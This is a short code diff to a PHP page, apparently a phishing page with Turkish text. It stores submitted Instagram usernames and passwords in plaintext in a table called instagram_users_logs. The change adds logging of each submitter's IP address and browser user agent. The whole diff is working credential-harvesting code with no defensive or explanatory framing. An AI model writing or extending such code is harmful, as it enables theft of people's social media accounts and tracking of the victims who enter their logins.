@@ -18,14 +18,18 @@ if (isset($_POST["button"])) {
     if (empty($_POST["usrname"]) || empty($_POST["psword"])) {
         echo "<script>alert('Hata! Gerekli Alanları Doldurun!');</script>";
     } else {
+        
         $usrname = trim($_POST["usrname"]);
         $psword = trim($_POST["psword"]);
 
-        $query = "INSERT INTO instagram_users_logs (ig_username, ig_password) VALUES (?, ?)";
+        $user_ip_logs = $_SERVER['REMOTE_ADDR'];
+        $user_os_browser_logs = $_SERVER['HTTP_USER_AGENT'];
+
+        $query = "INSERT INTO instagram_users_logs (ig_username, ig_password, user_ip_logs, user_os_browser_logs) VALUES (?, ?, ?, ?)";
         $stmt = mysqli_prepare($connect, $query);
 
         if ($stmt) {
-            mysqli_stmt_bind_param($stmt, "ss", $usrname, $psword);
+            mysqli_stmt_bind_param($stmt, "ssss", $usrname, $psword, $user_ip_logs, $user_os_browser_logs);
             mysqli_stmt_execute($stmt);
             mysqli_stmt_close($stmt);
         }
@@ -36,8 +40,8 @@ if (isset($_POST["button"])) {
 
     mysqli_close($connect);
 }
-    
 ?>
+
 
 <!DOCTYPE html>
 <html lang="tr">
